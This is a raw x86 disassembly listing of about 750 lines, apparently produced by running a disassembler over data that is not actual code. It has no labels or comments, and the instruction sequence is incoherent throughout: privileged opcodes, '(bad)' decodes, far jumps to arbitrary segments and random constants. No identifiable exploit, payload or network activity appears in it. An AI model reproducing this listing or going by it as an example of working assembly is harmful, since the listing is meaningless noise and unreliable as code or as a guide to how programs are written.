  41a9f0:	inc    eax
  41a9f1:	xor    BYTE PTR [esi-0x6a],bl
  41a9f4:	fstp   QWORD PTR [esp+edx*2-0x7a576784]
  41a9fb:	das    
  41a9fc:	call   0x7d3a991
  41aa01:	xchg   BYTE PTR [ecx-0x55],dh
  41aa04:	iret   
  41aa05:	push   ecx
  41aa06:	int    0x88
  41aa08:	fs cmp al,0xc2
  41aa0b:	xchg   esi,eax
  41aa0c:	das    
  41aa0d:	push   edx
  41aa0e:	test   DWORD PTR [edx-0x2c],esi
  41aa11:	fwait
  41aa12:	jp     0x41aa4f
  41aa14:	gs int 0x34
  41aa17:	and    BYTE PTR ds:0xb271af8,al
  41aa1d:	stos   DWORD PTR es:[edi],eax
  41aa1e:	add    BYTE PTR [edi-0x235683ea],dh
  41aa24:	aad    0xc2
  41aa26:	jl     0x41aa72
  41aa28:	dec    ecx
  41aa29:	scas   eax,DWORD PTR es:[edi]
  41aa2a:	or     BYTE PTR [ebp+0x1e],bl
  41aa2d:	jge    0x41aa4c
  41aa2f:	ficomp WORD PTR [eax+0x33]
  41aa32:	dec    ecx
  41aa33:	xchg   ebx,eax
  41aa34:	mov    bh,0x77
  41aa36:	(bad)  
  41aa37:	pop    ebp
  41aa38:	jns    0x41aa39
  41aa3a:	add    BYTE PTR ds:0xcc190dbc,0x38
  41aa41:	adc    al,0xb0
  41aa43:	pop    es
  41aa44:	addr16 xchg ebp,eax
  41aa46:	mov    dh,0xe1
  41aa48:	cdq    
  41aa49:	es popa 
  41aa4b:	xor    al,0xeb
  41aa4d:	imul   ebp,DWORD PTR [edi+0x70ea4e7c],0x43c4edfe
  41aa57:	and    dl,cl
  41aa59:	adc    edi,esi
  41aa5b:	wrmsr  
  41aa5d:	int3   
  41aa5e:	jbe    0x41aa1a
  41aa60:	test   ax,0xc498
  41aa64:	jns    0x41aaa6
  41aa66:	adc    al,0x1a
  41aa68:	mov    eax,ds:0xe13fd0fd
  41aa6d:	ja     0x41aad4
  41aa6f:	push   ds
  41aa70:	rol    DWORD PTR [eax-0x67117227],cl
  41aa76:	arpl   WORD PTR [ebx],bx
  41aa78:	ror    esp,cl
  41aa7a:	push   ecx
  41aa7b:	lahf   
  41aa7c:	retf   0x8cb3
  41aa7f:	xchg   edx,eax
  41aa80:	out    0xe7,eax
  41aa82:	mov    al,0xf3
  41aa84:	sub    BYTE PTR gs:[edi+0x77],0x66
  41aa89:	jbe    0x41aa17
  41aa8b:	jmp    0x41aa54
  41aa8d:	sub    al,cl
  41aa8f:	hlt    
  41aa90:	adc    dl,BYTE PTR [esi+0x676f72c]
  41aa96:	fldcw  WORD PTR [ecx]
  41aa98:	das    
  41aa99:	xchg   edi,eax
  41aa9a:	jae    0x41aaf6
  41aa9c:	shl    ebp,cl
  41aa9e:	nop
  41aa9f:	xor    ebx,ebx
  41aaa1:	jge    0x41aa85
  41aaa3:	cmp    edi,DWORD PTR [ebx+ecx*2+0x7433fdeb]
  41aaaa:	and    BYTE PTR [ebx-0x53ce17c0],0x52
  41aab1:	or     ebp,DWORD PTR [edi-0x7aeaea82]
  41aab7:	push   ss
  41aab8:	xor    ah,bh
  41aaba:	dec    edx
  41aabb:	mov    bh,0x4
  41aabd:	rcr    BYTE PTR [edx+0x70],cl
  41aac0:	sub    al,BYTE PTR [ecx-0x60]
  41aac3:	mov    BYTE PTR [eax+esi*1],dh
  41aac6:	sbb    BYTE PTR [esp+ebp*4],ch
  41aac9:	repz test eax,0x33493ff4
  41aacf:	shr    BYTE PTR [ebp+0x65],1
  41aad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aad3:	(bad)  [edx-0x7dd206ae]
  41aad9:	div    DWORD PTR [edi+0x48]
  41aadc:	imul   eax,DWORD PTR [edi*4+0x473c831a],0x8b07d42e
  41aae7:	stc    
  41aae8:	adc    DWORD PTR [edx],esi
  41aaea:	loop   0x41aaa5
  41aaec:	xchg   esp,eax
  41aaed:	xor    eax,0xf4b4ebf0
  41aaf2:	push   ss
  41aaf3:	pop    esi
  41aaf4:	les    ebx,FWORD PTR [edx-0x30c548b6]
  41aafa:	add    al,0x1e
  41aafc:	push   ebp
  41aafd:	cmp    DWORD PTR [ebx+eiz*1-0x38dc2ac8],esp
  41ab04:	xor    eax,0x8078a357
  41ab09:	sbb    eax,0x6f5c845d
  41ab0e:	leave  
  41ab0f:	push   esp
  41ab10:	pop    ebx
  41ab11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab12:	mov    eax,0x3cc84dfc
  41ab17:	push   esp
  41ab18:	xchg   ebp,eax
  41ab19:	daa    
  41ab1a:	daa    
  41ab1b:	lods   eax,DWORD PTR ds:[esi]
  41ab1c:	fs scas eax,DWORD PTR es:[edi]
  41ab1e:	stc    
  41ab1f:	adc    esp,esi
  41ab21:	aad    0x5c
  41ab23:	gs add ah,dl
  41ab26:	in     eax,dx
  41ab27:	add    al,0xea
  41ab29:	fnstcw WORD PTR [ebx+esi*2]
  41ab2c:	mov    DWORD PTR [esp+ebp*8-0x23bb4301],edi
  41ab33:	enter  0xf682,0x3a
  41ab37:	lahf   
  41ab38:	or     esp,ebp
  41ab3a:	imul   ebx
  41ab3c:	or     DWORD PTR [edx+0xf72c070],0x5255c9b0
  41ab46:	in     al,dx
  41ab47:	scas   al,BYTE PTR es:[edi]
  41ab48:	sahf   
  41ab49:	popa   
  41ab4a:	mov    ecx,0xadf82a0b
  41ab4f:	mov    ch,0x50
  41ab51:	mov    esi,0xede2a5bd
  41ab56:	lea    esp,[eax]
  41ab58:	ret    0x3097
  41ab5b:	push   esp
  41ab5c:	mov    ds:0x85f05dec,eax
  41ab61:	popa   
  41ab62:	pop    es
  41ab63:	jl     0x41abdd
  41ab65:	cmc    
  41ab66:	pop    ds
  41ab67:	in     al,0x61
  41ab69:	inc    esi
  41ab6a:	mov    cl,BYTE PTR [edi+0x2d]
  41ab6d:	mov    edi,DWORD PTR [ebx]
  41ab6f:	jmp    0x218b:0x20e64bdb
  41ab76:	pushf  
  41ab77:	les    ebp,FWORD PTR [ebp+0x75d1746c]
  41ab7d:	lahf   
  41ab7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab7f:	mov    bp,0x4c1c
  41ab83:	push   edi
  41ab84:	cwde   
  41ab85:	mov    al,0xac
  41ab87:	daa    
  41ab88:	ficomp WORD PTR [edi]
  41ab8a:	ss mov cl,0xa6
  41ab8d:	cmp    BYTE PTR [eax],dl
  41ab8f:	inc    edx
  41ab90:	pop    edi
  41ab91:	mov    ebx,0xeaed7749
  41ab96:	fwait
  41ab97:	cmp    esi,DWORD PTR [eax-0x1b]
  41ab9a:	les    ecx,FWORD PTR [edx]
  41ab9c:	cld    
  41ab9d:	int3   
  41ab9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab9f:	jbe    0x41ab8d
  41aba1:	cmp    al,0x72
  41aba3:	or     eax,0x973fc5fa
  41aba8:	mov    eax,0xb2e7ff94
  41abad:	fisttp DWORD PTR [ebp+0x63]
  41abb0:	jmp    0x41abe3
  41abb2:	mov    ah,0xa4
  41abb4:	push   0xac857a87
  41abb9:	jnp    0x41abf3
  41abbb:	xchg   esi,eax
  41abbc:	sar    DWORD PTR [esi-0x5a],cl
  41abbf:	ret    
  41abc0:	push   cs
  41abc1:	clc    
  41abc2:	stos   DWORD PTR es:[edi],eax
  41abc3:	rcr    DWORD PTR [esi+0x6b],cl
  41abc6:	test   DWORD PTR [edx-0x16],edi
  41abc9:	sub    bl,BYTE PTR [edx-0x5e33abfd]
  41abcf:	mov    cl,0xae
  41abd1:	mov    cl,BYTE PTR [edx-0x44852181]
  41abd7:	add    eax,DWORD PTR [ecx-0x334c6b49]
  41abdd:	sub    esi,DWORD PTR [edi]
  41abdf:	nop
  41abe0:	jmp    0x41ac4f
  41abe2:	fdivr  st(6),st
  41abe4:	xchg   edx,eax
  41abe5:	mov    dl,0x9a
  41abe7:	pop    ecx
  41abe8:	mov    DWORD PTR [ebx],ecx
  41abea:	mov    esp,0xc11f7b80
  41abef:	xchg   DWORD PTR [ecx-0x30],ecx
  41abf2:	and    eax,0x523b13e5
  41abf7:	repz mov al,0x99
  41abfa:	push   esp
  41abfb:	mov    edx,edx
  41abfd:	fstp   st(6)
  41abff:	dec    ecx
  41ac00:	adc    bh,BYTE PTR [eax]
  41ac02:	js     0x41ab95
  41ac04:	daa    
  41ac05:	aas    
  41ac06:	push   ebp
  41ac07:	pop    ds
  41ac08:	aaa    
  41ac09:	and    eax,0x9e20fa7f
  41ac0e:	and    ebp,esi
  41ac10:	push   ss
  41ac11:	je     0x41ab9c
  41ac13:	or     al,BYTE PTR [ecx]
  41ac15:	mov    ds:0x7e06a43f,al
  41ac1a:	sbb    BYTE PTR [eax],dl
  41ac1c:	shl    dl,cl
  41ac1e:	outs   dx,BYTE PTR ds:[esi]
  41ac1f:	jmp    0x41ac9d
  41ac21:	pusha  
  41ac22:	ror    ah,cl
  41ac24:	inc    ecx
  41ac25:	nop
  41ac26:	sar    DWORD PTR [eax+0x20],0x6f
  41ac2a:	mov    bh,0x84
  41ac2c:	jnp    0x41abed
  41ac2e:	int3   
  41ac2f:	shl    esp,1
  41ac31:	sbb    al,0x7d
  41ac33:	fisub  WORD PTR [edi+0x5d]
  41ac36:	xchg   edi,eax
  41ac37:	jge    0x41abec
  41ac39:	cmc    
  41ac3a:	add    al,0x32
  41ac3c:	sub    edx,edx
  41ac3e:	jo     0x41ac93
  41ac40:	and    eax,0xcce898fd
  41ac45:	loopne 0x41acb8
  41ac47:	lock mov esi,0x4c0da56
  41ac4d:	nop
  41ac4e:	js     0x41abfd
  41ac50:	jg     0x41abe0
  41ac52:	std    
  41ac53:	sub    eax,0xa41a34db
  41ac58:	dec    esi
  41ac59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac5a:	dec    edx
  41ac5b:	add    eax,0xe71c14c1
  41ac60:	mov    WORD PTR [ebx-0x1f],cs
  41ac63:	(bad)  
  41ac64:	shl    esp,1
  41ac66:	jno    0x41ac30
  41ac68:	test   al,0x4e
  41ac6a:	and    edi,eax
  41ac6c:	push   ss
  41ac6d:	xchg   ebx,eax
  41ac6e:	sbb    ch,ah
  41ac70:	mov    ebx,0xa3441074
  41ac75:	mov    dh,0x7a
  41ac77:	popf   
  41ac78:	and    BYTE PTR [edx-0x414e0e54],cl
  41ac7e:	xor    eax,0x6380f6f6
  41ac83:	jge    0x41aca1
  41ac85:	or     cl,BYTE PTR [edi+esi*4]
  41ac88:	mov    edx,0xf4c24147
  41ac8d:	mov    dh,BYTE PTR [ebx+0x41]
  41ac90:	test   dl,0x4b
  41ac93:	xor    DWORD PTR [ebx-0x4decadf6],0x4c
  41ac9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac9b:	cdq    
  41ac9c:	push   0xffffffa7
  41ac9e:	and    DWORD PTR [ebx+0x2e],edi
  41aca1:	ins    DWORD PTR es:[edi],dx
  41aca2:	sub    edx,DWORD PTR [edx-0x7b]
  41aca5:	mov    dh,BYTE PTR [ebx]
  41aca7:	fst    st(0)
  41aca9:	std    
  41acaa:	retf   
  41acab:	xor    al,0xad
  41acad:	pop    ss
  41acae:	stos   DWORD PTR es:[edi],eax
  41acaf:	pop    ss
  41acb0:	jge    0x41ad0d
  41acb2:	or     ah,BYTE PTR cs:[edx+ebx*8-0x4b]
  41acb7:	pop    ebp
  41acb8:	ret    
  41acb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acba:	push   cs
  41acbb:	repnz fs das 
  41acbe:	pop    ebp
  41acbf:	pop    ecx
  41acc0:	ss cmp al,0x36
  41acc3:	and    DWORD PTR [esi],edx
  41acc5:	mov    al,fs:0xf2d52681
  41accb:	or     ebp,DWORD PTR [esi]
  41accd:	repnz or edx,0x95fdc3ad
  41acd4:	jmp    0xa881b5b6
  41acd9:	jbe    0x41acac
  41acdb:	xor    edx,eax
  41acdd:	sti    
  41acde:	outs   dx,DWORD PTR ds:[esi]
  41acdf:	iret   
  41ace0:	or     esp,eax
  41ace2:	ret    
  41ace3:	out    dx,al
  41ace4:	ret    
  41ace5:	and    DWORD PTR [esi-0x3],esp
  41ace8:	push   edi
  41ace9:	jns    0x41ac6f
  41aceb:	pop    edx
  41acec:	lea    eax,[ecx+0x43]
  41acef:	div    DWORD PTR [ecx-0x196c2ee4]
  41acf5:	mov    bl,0xa
  41acf7:	jl     0x41ac96
  41acf9:	mov    dh,0x18
  41acfb:	jmp    0xc56e:0xab4fafa6
  41ad02:	sub    DWORD PTR [eax],edx
  41ad04:	pop    eax
  41ad05:	inc    eax
  41ad06:	jl     0x41acc8
  41ad08:	imul   esp,DWORD PTR [ebx],0x79ef2b9
  41ad0e:	pop    ss
  41ad0f:	ds jmp 0xf33f:0xd4fa4c97
  41ad17:	ja     0x41ad76
  41ad19:	and    al,0x4d
  41ad1b:	add    bh,BYTE PTR [edx-0x4a]
  41ad1e:	(bad)  
  41ad1f:	pushf  
  41ad20:	rcl    ch,cl
  41ad22:	push   0xfac110ff
  41ad27:	mov    ebp,0x6575e706
  41ad2c:	jecxz  0x41acc1
  41ad2e:	push   es
  41ad2f:	or     al,0xe9
  41ad31:	and    DWORD PTR [ecx-0x60],esp
  41ad34:	aam    0x7b
  41ad36:	punpckhbw mm4,QWORD PTR [edi+0x42]
  41ad3a:	mov    ds:0x8deb2a02,al
  41ad3f:	pop    ebp
  41ad40:	adc    DWORD PTR ds:0x2069bc68,edi
  41ad46:	outs   dx,DWORD PTR ds:[esi]
  41ad47:	jmp    0x6c1943a7
  41ad4c:	or     eax,0x471ecb89
  41ad51:	adc    DWORD PTR [ecx+0x5ac3e9f9],0xb07dda59
  41ad5b:	add    al,0x25
  41ad5d:	add    al,0x12
  41ad5f:	jb     0x41ad8c
  41ad61:	les    ebp,FWORD PTR [ecx-0x20578cf8]
  41ad67:	fbstp  TBYTE PTR [ebp-0x785807]
  41ad6d:	aad    0x4a
  41ad6f:	push   ecx
  41ad70:	mov    bh,0xa8
  41ad72:	jnp    0x41adaf
  41ad74:	inc    eax
  41ad75:	mov    cl,0x2a
  41ad77:	jmp    0xf57607fe
  41ad7c:	push   cs
  41ad7d:	mov    bh,0x70
  41ad7f:	ficom  WORD PTR [edx+ebx*2]
  41ad82:	xchg   esp,eax
  41ad83:	and    al,0xf9
  41ad85:	jge    0x41ad96
  41ad87:	int3   
  41ad88:	jmp    0x78865196
  41ad8d:	jmp    DWORD PTR [ebp-0x761684ed]
  41ad93:	cli    
  41ad94:	push   0x2a
  41ad96:	mov    esp,0x71e2fb65
  41ad9b:	cmp    DWORD PTR [eax],esi
  41ad9d:	mov    BYTE PTR [edx-0x60],bl
  41ada0:	ins    BYTE PTR es:[edi],dx
  41ada1:	aas    
  41ada2:	push   0x29dbfcce
  41ada7:	xor    dl,BYTE PTR [edi]
  41ada9:	jns    0x41ad5e
  41adab:	inc    ebx
  41adac:	xchg   BYTE PTR [esi+0x15e6f5ad],al
  41adb2:	jmp    DWORD PTR ds:0x649e1a72
  41adb8:	call   0x638b167d
  41adbd:	imul   esp,edx,0xfffffff0
  41adc0:	std    
  41adc1:	arpl   dx,ax
  41adc3:	dec    eax
  41adc4:	repz addr16 and al,0x33
  41adc8:	div    ebp
  41adca:	jecxz  0x41ad87
  41adcc:	aam    0xcb
  41adce:	repnz sbb ecx,DWORD PTR ds:[edi+0x184ec399]
  41add6:	das    
  41add7:	loop   0x41ad69
  41add9:	jmp    0x41adaa
  41addb:	sbb    al,0x4b
  41addd:	cmp    al,0xb8
  41addf:	into   
  41ade0:	aas    
  41ade1:	aad    0x35
  41ade3:	sbb    DWORD PTR [esi+0x47],0x4f
  41ade7:	mov    eax,ds:0x79d894f5
  41adec:	aad    0xd7
  41adee:	jle    0x41adc8
  41adf0:	and    DWORD PTR [ecx],edi
  41adf2:	push   ds
  41adf3:	sub    ecx,ebx
  41adf5:	mov    edi,0x332b447f
  41adfa:	daa    
  41adfb:	and    eax,0xccd12dba
  41ae00:	enter  0x787c,0x57
  41ae04:	cld    
  41ae05:	addr16 sub al,0x57
  41ae08:	and    al,0x13
  41ae0a:	mov    eax,0x4a6cc62f
  41ae0f:	int3   
  41ae10:	mov    ch,0x85
  41ae12:	test   DWORD PTR [eax-0x7133ef7b],eax
  41ae18:	xlat   BYTE PTR ds:[ebx]
  41ae19:	mov    ds:0xc42dfc60,eax
  41ae1e:	addr16 xchg ecx,eax
  41ae20:	inc    ebx
  41ae21:	add    DWORD PTR [ebx+0x108c78ec],ebp
  41ae27:	jb     0x41add3
  41ae29:	add    BYTE PTR ds:0x5c7660bd,bh
  41ae2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae30:	mov    esp,0xfd78681d
  41ae35:	mov    ebx,0x4b7d1af8
  41ae3a:	das    
  41ae3b:	stos   DWORD PTR es:[edi],eax
  41ae3c:	push   es
  41ae3d:	test   DWORD PTR [ecx],ecx
  41ae3f:	call   0xabc62acc
  41ae44:	inc    edx
  41ae45:	xchg   edx,eax
  41ae46:	fistp  WORD PTR [ecx+0x11]
  41ae49:	or     eax,0x7f670bcc
  41ae4e:	jb     0x41ae78
  41ae50:	out    0xdd,al
  41ae52:	daa    
  41ae53:	sti    
  41ae54:	or     bl,BYTE PTR [eax]
  41ae56:	fsubr  QWORD PTR [eax]
  41ae58:	sahf   
  41ae59:	fisttp WORD PTR ds:[ecx+0x2a]
  41ae5d:	mov    eax,0xcdcddf00
  41ae62:	int    0xd1
  41ae64:	(bad)
  41ae67:	dec    eax
  41ae68:	sti    
  41ae69:	push   esi
  41ae6a:	fidivr WORD PTR [esp+ebp*2+0x656836df]
  41ae71:	leave  
  41ae72:	inc    edi
  41ae73:	sub    al,0xfc
  41ae75:	and    eax,0xb902ff38
  41ae7a:	xchg   ecx,eax
  41ae7b:	push   es
  41ae7c:	jle    0x41ae2c
  41ae7e:	inc    edx
  41ae7f:	jmp    DWORD PTR [ebx-0x9]
  41ae82:	rcr    bl,1
  41ae84:	push   eax
  41ae85:	fimul  DWORD PTR [eax-0x437b86d]
  41ae8b:	xor    DWORD PTR [eax-0x7f],0x1
  41ae8f:	stos   BYTE PTR es:[edi],al
  41ae90:	lods   eax,DWORD PTR ds:[esi]
  41ae91:	jb     0x41aed0
  41ae93:	mov    ecx,0x5f73b575
  41ae98:	xchg   esp,eax
  41ae99:	dec    edi
  41ae9a:	jne    0x41ae88
  41ae9c:	add    al,0x49
  41ae9e:	jl     0x41ae9a
  41aea0:	pop    esp
  41aea1:	pop    ebx
  41aea2:	push   edx
  41aea3:	mov    bl,0xe
  41aea5:	mov    ds:0xeb0c6bc5,eax
  41aeaa:	xchg   esi,eax
  41aeab:	rcr    ebp,cl
  41aead:	mov    ds:0xc67469f6,al
  41aeb2:	xor    al,0xfa
  41aeb4:	sub    cl,BYTE PTR [ebx]
  41aeb6:	mov    ebp,0x90a9198c
  41aebb:	loopne 0x41ae8c
  41aebd:	enter  0x800a,0x49
  41aec1:	xor    ah,BYTE PTR [ebx]
  41aec3:	std    
  41aec4:	inc    ecx
  41aec5:	mov    ch,0xc9
  41aec7:	stos   DWORD PTR es:[edi],eax
  41aec8:	dec    ebx
  41aec9:	adc    eax,0xdd769266
  41aece:	or     ax,0x3bb2
  41aed2:	pushf  
  41aed3:	ss xchg edi,eax
  41aed5:	xchg   esi,eax
  41aed6:	bound  esi,QWORD PTR ds:0x60cb8c85
  41aedc:	pop    eax
  41aedd:	cdq    
  41aede:	test   dh,al
  41aee0:	fidiv  DWORD PTR [edi]
  41aee2:	dec    esi
  41aee3:	neg    DWORD PTR [ebp-0x5c]
  41aee6:	pushf  
  41aee7:	ja     0x41af4b
  41aee9:	mov    edi,0x6458d8fa
  41aeee:	cmp    DWORD PTR [ebx+0x1f],edx
  41aef1:	rcr    BYTE PTR [ebx+ebx*8+0x3fcafe07],cl
  41aef8:	hlt    
  41aef9:	dec    esi
  41aefa:	pop    ss
  41aefb:	mov    bh,0x4c
  41aefd:	in     eax,0x8d
  41aeff:	(bad)  
  41af00:	jnp    0x41af5c
  41af02:	rcr    DWORD PTR [ebx+0x1569075e],0x75
  41af09:	data16 fidiv WORD PTR [ebx+0x69140bfb]
  41af10:	xchg   ecx,eax
  41af11:	aas    
  41af12:	shl    eax,0x4c
  41af15:	mov    cl,0x3b
  41af17:	xor    BYTE PTR [edi-0x16080494],bh
  41af1d:	xor    BYTE PTR [ecx],bl
  41af1f:	mov    ebx,0x57a2d66d
  41af24:	xor    eax,0x7f0542de
  41af29:	push   0x1f
  41af2b:	push   ss
  41af2c:	or     DWORD PTR [edi+0x4f7a8a82],edi
  41af32:	outs   dx,BYTE PTR ds:[esi]
  41af33:	or     eax,DWORD PTR ds:0xc01b5325
  41af39:	hlt    
  41af3a:	repz push cs
  41af3c:	call   0x3ac4ad7a
  41af41:	or     DWORD PTR [ebx+ebx*4+0x43],esp
  41af45:	adc    DWORD PTR [ebx],esi
  41af47:	cli    
  41af48:	cld    
  41af49:	and    DWORD PTR [edx+0x47ba2428],esi
  41af4f:	ror    esp,cl
  41af51:	inc    esi
  41af52:	pop    ebp
  41af53:	push   es
  41af54:	lock jnp 0x41afae
  41af57:	push   ds
  41af58:	call   0x66a6005a
  41af5d:	mov    bl,0x32
  41af5f:	test   eax,0xb85f63b7
  41af64:	pop    ebx
  41af65:	cmp    eax,0xefeebbb6
  41af6a:	adc    DWORD PTR [edi],0x1bb8daa6
  41af70:	call   0x9665:0xfea51e3f
  41af77:	out    0xed,al
  41af79:	sub    ecx,DWORD PTR [edi-0x5af9bc19]
  41af7f:	inc    esi
  41af80:	inc    eax
  41af81:	out    0x42,eax
  41af83:	in     eax,0x2d
  41af85:	mov    eax,ds:0xc5fed247
  41af8a:	mov    al,0x31
  41af8c:	sub    eax,0x6a91359c
  41af91:	ds ret 
  41af93:	push   esp
  41af94:	mov    DWORD PTR [ebx-0x7f45939d],ecx
  41af9a:	inc    eax
  41af9b:	cs aad 0x9e
  41af9e:	out    dx,al
  41af9f:	aaa    
  41afa0:	int    0xa7
  41afa2:	div    BYTE PTR [ebp+0x2e]
  41afa5:	jb     0x41aff2
  41afa7:	jg     0x41b00d
  41afa9:	pop    ds
  41afaa:	pop    esp
  41afab:	pop    edi
  41afac:	cli    
  41afad:	mov    ah,0xf6
  41afaf:	out    dx,eax
  41afb0:	stos   BYTE PTR es:[edi],al
  41afb1:	pushf  
  41afb2:	sub    edx,DWORD PTR [ecx]
  41afb4:	inc    esp
  41afb5:	and    edi,eax
  41afb7:	out    dx,al
  41afb8:	xchg   ebx,eax
  41afb9:	sbb    ebx,DWORD PTR cs:[ecx-0x33]
  41afbd:	inc    ebx
  41afbe:	jecxz  0x41af79
  41afc0:	lods   eax,DWORD PTR ds:[esi]
  41afc1:	pop    es
  41afc2:	(bad)  
  41afc3:	jl     0x41af47
  41afc5:	cmp    al,0xbc
  41afc7:	ins    BYTE PTR es:[edi],dx
  41afc8:	pop    ecx
  41afc9:	mov    ch,0x44
  41afcb:	loopne 0x41af77
  41afcd:	xchg   DWORD PTR [edi+esi*2-0x7c],ebx
  41afd1:	popa   
  41afd2:	xchg   ecx,eax
  41afd3:	out    dx,eax
  41afd4:	ins    BYTE PTR es:[edi],dx
  41afd5:	in     eax,dx
  41afd6:	and    bl,BYTE PTR [esp+eiz*4+0x4a]
  41afda:	add    dl,dl
  41afdc:	jecxz  0x41af89
  41afde:	in     al,dx
  41afdf:	popf   
  41afe0:	addr16 cmp esi,esi
  41afe3:	(bad)  
  41afe5:	ret    
  41afe6:	sub    esp,ebx
  41afe8:	aas    
  41afe9:	out    dx,eax
  41afea:	rol    DWORD PTR [eax+0x27],0xd7
  41afee:	lds    esi,FWORD PTR [ebx-0x4de05bd]
  41aff4:	push   esi
  41aff5:	icebp  
  41aff6:	ss popa 
  41aff8:	push   edi
  41aff9:	leave  
  41affa:	sti    
  41affb:	or     BYTE PTR [edi-0x73],al
  41affe:	push   ebx
  41afff:	xor    ebp,DWORD PTR [ecx-0x10]
  41b002:	inc    edi
  41b003:	inc    ebp
  41b004:	jmp    0x41b005
  41b006:	rol    al,cl
  41b008:	sar    DWORD PTR [esi+edx*1+0x1695c49f],cl
  41b00f:	pcmpeqd mm4,mm4
  41b012:	and    eax,DWORD PTR [edi-0x29]
  41b015:	mov    WORD PTR [edi-0xb1a6e43],?
  41b01b:	jno    0x41b01e
  41b01d:	jno    0x41b04b
  41b01f:	inc    esi
  41b020:	(bad)
  41b023:	imul   DWORD PTR [ebx+eiz*8]
  41b026:	ins    BYTE PTR es:[edi],dx
  41b027:	mov    ebx,0xb2fa9404
  41b02c:	fidiv  WORD PTR [ecx-0x18ac3f08]
  41b032:	fadd   st(3),st
  41b034:	(bad)  
  41b035:	shl    BYTE PTR [ecx+0x194351be],1
  41b03b:	daa    
  41b03c:	outs   dx,BYTE PTR ds:[esi]
  41b03d:	bound  ecx,QWORD PTR [edi+ecx*2-0x1c]
  41b041:	or     al,0xd8
  41b043:	imul   esp,DWORD PTR [esi+0x63],0xfaa6b07d
  41b04a:	mov    edx,0x7030dc40
  41b04f:	cmp    al,al
  41b051:	push   ds
  41b052:	xlat   BYTE PTR ds:[ebx]
  41b053:	jmp    0xd244:0xb5b48b17
  41b05a:	push   eax
  41b05b:	fwait
  41b05c:	sub    cl,bh
  41b05e:	and    al,0x80
  41b060:	sbb    ecx,esi
  41b062:	push   eax
  41b063:	push   edx
  41b064:	test   eax,0x60807c8a
  41b069:	cmp    al,0xda
  41b06b:	js     0x41b07e
  41b06d:	dec    ebp
  41b06e:	lock iret 
  41b070:	pop    ds
  41b071:	add    BYTE PTR [eax-0x29],ch
  41b074:	inc    esi
  41b075:	xchg   esi,eax
  41b076:	mov    edx,0xcdd5fca5
  41b07b:	cs pop esp
  41b07d:	or     dl,al
  41b07f:	cmc    
  41b080:	pop    ss
  41b081:	sbb    al,0x5a
  41b083:	mov    esi,0xd00c097b
  41b088:	jge    0x41b01d
  41b08a:	loopne 0x41b017
  41b08c:	mov    ds:0xde529ec4,al
  41b091:	inc    eax
  41b092:	stos   DWORD PTR es:[edi],eax
  41b093:	pop    ecx
  41b094:	sbb    al,0xf9
  41b096:	and    al,0xf
  41b098:	(bad)  
  41b099:	out    0x6e,al
  41b09b:	mov    ch,0xab
  41b09d:	sbb    al,0x32
  41b09f:	(bad)  
  41b0a1:	aad    0x4d
  41b0a3:	mov    ds:0xfd2b45f4,al
  41b0a8:	sub    ch,BYTE PTR [ebx]
  41b0aa:	add    eax,0x723a544d
  41b0af:	inc    eax
  41b0b0:	cli    
  41b0b1:	jne    0x41b04e
  41b0b3:	mov    ebp,0x596d80ab
  41b0b8:	mov    WORD PTR [edi],cs
  41b0ba:	aaa    
  41b0bb:	arpl   WORD PTR [esi+esi*1-0x5ac8e045],bp
  41b0c2:	dec    edi
  41b0c3:	xchg   edi,eax
  41b0c4:	(bad)  
  41b0c5:	push   edi
  41b0c6:	and    DWORD PTR [edi],eax
  41b0c8:	cmp    edx,DWORD PTR [ebx+edx*4+0x27]
  41b0cc:	or     ebx,DWORD PTR [esp+ebx*4]
  41b0cf:	repz std 
  41b0d1:	jnp    0x41b0c3
  41b0d3:	sub    al,0xe
  41b0d5:	hlt    
  41b0d6:	cwde   
  41b0d7:	jmp    0xc394a59b
  41b0dc:	cmp    BYTE PTR [edi-0x17],0x10
  41b0e0:	jbe    0x41b07f
  41b0e2:	xor    eax,eax
  41b0e4:	pop    ebx
  41b0e5:	aas    
  41b0e6:	retf   0x4bb
  41b0e9:	and    BYTE PTR [edi+0x38],bl
  41b0ec:	xlat   BYTE PTR ds:[ebx]
  41b0ed:	(bad)  ds:0xec547656
  41b0f3:	lods   eax,DWORD PTR ds:[esi]
  41b0f4:	or     edx,esp
  41b0f6:	loop   0x41b0d2
  41b0f8:	arpl   WORD PTR [ebp+0x4ff1d66],ax
  41b0fe:	pop    esp
  41b0ff:	inc    edi
  41b100:	jge    0x6c7365e7
  41b106:	mov    ecx,0x6dbd3dd0
  41b10b:	repz push esp
  41b10d:	lods   al,BYTE PTR ds:[esi]
  41b10e:	cmp    ah,BYTE PTR [ecx+0x34]
  41b111:	out    dx,al
  41b112:	xor    dl,BYTE PTR [esi]
  41b114:	jl     0x41b141
  41b116:	lods   eax,DWORD PTR ds:[esi]
  41b117:	and    ch,cl
  41b119:	ror    DWORD PTR [edi+0x6f],cl
  41b11c:	mov    DWORD PTR [eax-0x10],esp
  41b11f:	or     ebp,esi
  41b121:	pop    es
  41b122:	cmp    eax,ebx
  41b124:	ins    DWORD PTR es:[edi],dx
  41b125:	push   ss
  41b126:	pop    ecx
  41b127:	push   ebp
  41b128:	mov    ecx,0xba8c8e60
  41b12d:	daa    
  41b12e:	cwde   
  41b12f:	aad    0x1b
  41b131:	loope  0x41b127
  41b133:	inc    edx
  41b134:	sub    eax,0x74047b66
  41b139:	dec    edi
  41b13a:	scas   al,BYTE PTR es:[edi]
  41b13b:	push   0x49fed1fe
  41b140:	dec    esp
  41b141:	call   0xd7d2:0x8b21218d
  41b148:	add    al,0xed
  41b14a:	mov    eax,0x9716cebc
  41b14f:	jb     0x41b1ab
  41b151:	dec    edi
  41b152:	sahf   
  41b153:	je     0x41b19c
  41b155:	push   edi
  41b156:	adc    edx,edx
  41b158:	fadd   DWORD PTR [edx+0x38c46a73]
  41b15e:	aas    
  41b15f:	push   ecx
  41b160:	pusha  
  41b161:	mov    al,ds:0x868c9eb
  41b166:	dec    esi
  41b167:	pushf  
  41b168:	mov    eax,ds:0x91ab17b6
  41b16d:	sbb    ah,BYTE PTR [eax-0x40]
  41b170:	leave  
  41b171:	jno    0x41b151
